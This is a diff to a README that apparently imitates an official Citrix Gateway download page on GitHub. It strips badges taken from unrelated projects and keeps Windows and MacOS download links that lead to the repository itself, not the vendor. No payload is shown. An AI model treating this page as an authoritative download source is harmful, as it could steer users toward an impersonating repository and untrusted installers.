@@ -1,13 +1,8 @@
-## Citrix Gateway: Download Secure Access Solution <img width="26px" src="https://github.com/Citrix-Gateway/Citrix-Gateway/blob/main/publisherIdproductId_15541_Small.png" alt=""></img>
-
-[![Backers on Open Collective](https://img.shields.io/github/license/instaloader/instaloader.svg)](#backers)
-[![Backers on Open Collective](https://img.shields.io/aur/version/instaloader.svg)](#backers)
-[![Sponsors on Open Collective](https://pepy.tech/badge/instaloader/month)](#sponsors)
-[![Mega Sponsors on Open Collective](https://img.shields.io/github/contributors/unoplatform/uno.svg?style=flat&color=7a67f8)](#mega-sponsors)
+## <img width="26px" src="https://github.com/Citrix-Gateway/Citrix-Gateway/blob/main/publisherIdproductId_15541_Small.png" alt=""></img> Citrix Gateway: Download Secure Access Solution
 
 
 
-| Jump to: | [Windows](https://github.com/Citrix-Gateway/Citrix-Gateway#Windows) | [MacOS](https://github.com/Citrix-Gateway/Citrix-Gateway#MacOS) | [Linux](https://www.citrix.com/downloads/) | [Other platforms](https://www.citrix.com/downloads/) |
+| Go to: | [Windows](https://github.com/Citrix-Gateway/Citrix-Gateway#Windows) | [MacOS](https://github.com/Citrix-Gateway/Citrix-Gateway#MacOS) | [Linux](https://www.citrix.com/downloads/) | [Other platforms](https://www.citrix.com/downloads/) |
 | -------- | ---------------------------------------------------------- | ------------------------------------------------------ | ------------------------------------------ | ---------------------------------------------------- |
 
 
